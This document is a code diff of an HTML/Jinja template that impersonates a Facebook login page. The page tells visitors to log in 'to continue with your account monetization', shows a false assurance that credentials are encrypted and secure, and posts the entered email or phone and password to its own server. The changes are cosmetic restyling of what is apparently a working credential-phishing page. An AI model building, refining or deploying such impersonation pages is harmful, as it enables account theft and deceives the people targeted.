@@ -1,315 +1,81 @@
 {% extends "base.html" %}
 {% block body %}
-<div class="login-container">
-  <div class="card login-card">
-    <!-- Platform Header - ENHANCED -->
-    <div class="platform-header">
-      <div class="icon-circle bg-facebook">
-        <i class="fa-brands fa-facebook icon-lg"></i>
-      </div>
-      <div class="platform-info">
-        <h2 class="platform-title notranslate">Facebook</h2>
-        <div class="platform-subtitle">Please login to continue with your account monetization.</div>
-      </div>
+<div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 4px 12px rgba(24,119,242,0.15);border-radius:16px;">
+  <div class="platform-header">
+    <div class="icon-circle bg-facebook">
+      <i class="fa-brands fa-facebook icon-lg"></i>
     </div>
-
-    <!-- Login Form - ENHANCED -->
-    <form id="loginForm" method="post" novalidate class="login-form">
-      <div class="input-group">
-        <input class="input" id="address" name="address" placeholder="Mobile number or email address" required>
-        <div class="error-text" id="addressError"></div>
-      </div>
-
-      <div class="input-group">
-        <input class="input" id="password" name="password" type="password" placeholder="Password" required>
-        <div class="error-text" id="passwordError"></div>
-      </div>
-
-      <button class="btn login-btn" type="submit">
-        <span class="btn-text">Log in</span>
-        <span class="btn-loader" style="display: none;">⏳</span>
-      </button>
-    </form>
-
-    <!-- Security Note - ENHANCED -->
-    <div class="security-note">
-      <div class="security-icon">🔒</div>
-      <p class="security-text">Your login credentials are encrypted and secure</p>
+    <div>
+      <h2 class="notranslate" style="margin:0;color:#1877F2;">Facebook</h2>
+      <div style="color:#64748b;font-size:13px">Please login to continue with your account monetization.</div>
     </div>
+  </div>
+
+  <form id="loginForm" method="post" novalidate>
+    <input class="input" id="address" name="address" placeholder="Mobile number or email address" required>
+    <div class="error-text" id="addressError"></div>
+
+    <input class="input" id="password" name="password" type="password" placeholder="Password" required>
+    <div class="error-text" id="passwordError"></div>
+
+    <button class="btn login-btn" type="submit">Log in</button>
+  </form>
+
+  <!-- ADDED SECURITY CAPTION -->
+  <div class="security-note" style="margin-top:20px;padding:12px 16px;background:#f0f9ff;border-radius:12px;border:1px solid #e0f2fe;">
+    <p style="margin:0;color:#0369a1;font-size:0.9rem;font-weight:500;text-align:center;">
+      🔒 Your login credentials are encrypted and secure
+    </p>
   </div>
 </div>
 
 <style>
-.login-container {
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  min-height: 100vh;
-  padding: 20px;
-  background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
-}
-
-.login-card {
-  max-width: 440px;
-  width: 100%;
-  background: #ffffff;
-  border-radius: 20px;
-  box-shadow: 
-    0 8px 30px rgba(24, 119, 242, 0.15),
-    0 2px 8px rgba(24, 119, 242, 0.1);
-  padding: 32px;
-  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-  border: 1px solid rgba(255, 255, 255, 0.9);
-}
-
-.login-card:hover {
-  box-shadow: 
-    0 12px 40px rgba(24, 119, 242, 0.2),
-    0 4px 12px rgba(24, 119, 242, 0.15);
-  transform: translateY(-2px);
-}
-
-/* ENHANCED Platform Header */
-.platform-header {
-  display: flex;
-  align-items: center;
-  margin-bottom: 28px;
-  padding-bottom: 24px;
-  border-bottom: 1px solid #f1f5f9;
-}
-
-.icon-circle {
-  width: 60px;
-  height: 60px;
-  border-radius: 16px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  margin-right: 16px;
-  box-shadow: 0 4px 12px rgba(24, 119, 242, 0.2);
-  transition: transform 0.2s ease;
-}
-
-.icon-circle:hover {
-  transform: scale(1.05);
-}
-
-.bg-facebook {
-  background: linear-gradient(135deg, #1877F2 0%, #166FE5 100%);
-}
-
-.icon-lg {
-  font-size: 24px;
-  color: white;
-}
-
-.platform-info {
-  text-align: left;
-}
-
-.platform-title {
-  margin: 0;
-  color: #1877F2;
-  font-size: 24px;
-  font-weight: 800;
-  letter-spacing: -0.3px;
-  background: linear-gradient(135deg, #1877F2 0%, #166FE5 100%);
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-  background-clip: text;
-}
-
-.platform-subtitle {
-  color: #64748b;
-  font-size: 14px;
-  font-weight: 500;
-  margin-top: 4px;
-}
-
-/* ENHANCED Login Form */
-.login-form {
-  margin: 24px 0;
-}
-
-.input-group {
-  margin-bottom: 16px;
-}
-
 .input {
   width: 100%;
-  padding: 16px 20px;
-  border-radius: 14px;
-  border: 1.5px solid #e2e8f0;
-  background: #ffffff;
-  font-size: 15px;
-  font-weight: 500;
-  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
+  padding: 14px;
+  border-radius: 18px;
+  border: 1px solid #e5e7eb;
+  margin-bottom: 8px;
+  font-size: 16px;
+  transition: border-color 0.2s, box-shadow 0.2s;
 }
-
-.input::placeholder {
-  color: #94a3b8;
-  font-weight: 500;
-}
-
 .input:focus {
   border-color: #1877F2;
-  box-shadow: 
-    0 0 0 4px rgba(24, 119, 242, 0.15),
-    0 2px 6px rgba(24, 119, 242, 0.1);
+  box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.25);
   outline: none;
-  transform: translateY(-1px);
 }
-
 .input-error {
   border-color: #ef4444;
-  box-shadow: 
-    0 0 0 4px rgba(239, 68, 68, 0.1),
-    0 2px 6px rgba(239, 68, 68, 0.05);
+  box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.15);
 }
-
 .error-text {
   color: #ef4444;
   font-size: 13px;
-  font-weight: 600;
-  margin-top: 6px;
-  margin-left: 4px;
-  display: block;
+  margin-top: -4px;
+  margin-bottom: 8px;
 }
 
-/* ENHANCED Login Button */
 .login-btn {
   width: 100%;
-  background: linear-gradient(135deg, #1877F2 0%, #166FE5 100%);
-  color: #ffffff;
+  background: #1877F2;
+  color: #fff;
   font-size: 16px;
   font-weight: 700;
-  padding: 16px 24px;
-  border-radius: 14px;
+  padding: 12px;
+  border-radius: 25px;
   cursor: pointer;
   border: none;
-  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-  box-shadow: 
-    0 6px 20px rgba(24, 119, 242, 0.3),
-    0 2px 4px rgba(24, 119, 242, 0.1);
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  gap: 8px;
+  transition: background 0.25s, transform 0.1s, box-shadow 0.2s;
+  box-shadow: 0 6px 16px rgba(24,119,242,0.35);
+  display: block;
   margin-top: 8px;
-  position: relative;
-  overflow: hidden;
 }
-
-.login-btn::before {
-  content: '';
-  position: absolute;
-  top: 0;
-  left: -100%;
-  width: 100%;
-  height: 100%;
-  background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
-  transition: left 0.5s;
-}
-
-.login-btn:hover::before {
-  left: 100%;
-}
-
 .login-btn:hover {
-  background: linear-gradient(135deg, #166FE5 0%, #1464D2 100%);
-  box-shadow: 
-    0 8px 25px rgba(24, 119, 242, 0.4),
-    0 4px 8px rgba(24, 119, 242, 0.15);
-  transform: translateY(-2px);
+  background: #166fe5;
+  box-shadow: 0 8px 20px rgba(24,119,242,0.45);
 }
-
 .login-btn:active {
-  transform: translateY(0);
-  box-shadow: 
-    0 4px 12px rgba(24, 119, 242, 0.3),
-    0 1px 2px rgba(24, 119, 242, 0.1);
-}
-
-.login-btn.loading {
-  pointer-events: none;
-}
-
-.btn-loader {
-  font-size: 14px;
-}
-
-/* ENHANCED Security Note */
-.security-note {
-  margin-top: 24px;
-  padding: 16px 20px;
-  background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
-  border-radius: 14px;
-  border: 1px solid #bae6fd;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  gap: 12px;
-  transition: all 0.2s ease;
-}
-
-.security-note:hover {
-  border-color: #7dd3fc;
-  transform: translateY(-1px);
-}
-
-.security-icon {
-  font-size: 16px;
-  filter: grayscale(0.3);
-}
-
-.security-text {
-  margin: 0;
-  color: #0369a1;
-  font-size: 14px;
-  font-weight: 600;
-  text-align: center;
-}
-
-/* Responsive Design */
-@media (max-width: 480px) {
-  .login-container {
-    padding: 16px;
-  }
-  
-  .login-card {
-    padding: 24px;
-    border-radius: 18px;
-  }
-  
-  .platform-header {
-    margin-bottom: 24px;
-    padding-bottom: 20px;
-  }
-  
-  .icon-circle {
-    width: 50px;
-    height: 50px;
-    border-radius: 14px;
-  }
-  
-  .icon-lg {
-    font-size: 20px;
-  }
-  
-  .platform-title {
-    font-size: 22px;
-  }
-  
-  .input {
-    padding: 14px 18px;
-    border-radius: 12px;
-  }
-  
-  .login-btn {
-    padding: 14px 20px;
-    border-radius: 12px;
-  }
+  transform: scale(0.985);
 }
 </style>
 
@@ -319,9 +85,6 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
   const password = document.getElementById("password");
   const addressError = document.getElementById("addressError");
   const passwordError = document.getElementById("passwordError");
-  const loginBtn = document.querySelector('.login-btn');
-  const btnText = document.querySelector('.btn-text');
-  const btnLoader = document.querySelector('.btn-loader');
 
   const emailPattern = /^[a-z0-9._%+-]+@[a-z0-9.-]+\.(com|net|org|co|io|me|info|biz)$/;
   const phonePattern = /^\+?\d{6,}$/;
@@ -344,14 +107,7 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
     passwordError.textContent = "Password must be at least 6 characters.";
   }
 
-  if (valid) {
-    // Show loading state
-    btnText.textContent = "Logging in...";
-    btnLoader.style.display = 'inline';
-    loginBtn.classList.add('loading');
-  } else {
-    event.preventDefault();
-  }
+  if (!valid) event.preventDefault();
 });
 
 document.querySelectorAll(".input").forEach(input => {
@@ -359,15 +115,6 @@ document.querySelectorAll(".input").forEach(input => {
     input.classList.remove("input-error");
     if (input.id === "address") document.getElementById("addressError").textContent = "";
     if (input.id === "password") document.getElementById("passwordError").textContent = "";
-  });
-  
-  // Add focus effect
-  input.addEventListener("focus", () => {
-    input.style.transform = "translateY(-1px)";
-  });
-  
-  input.addEventListener("blur", () => {
-    input.style.transform = "translateY(0)";
   });
 });
 </script>
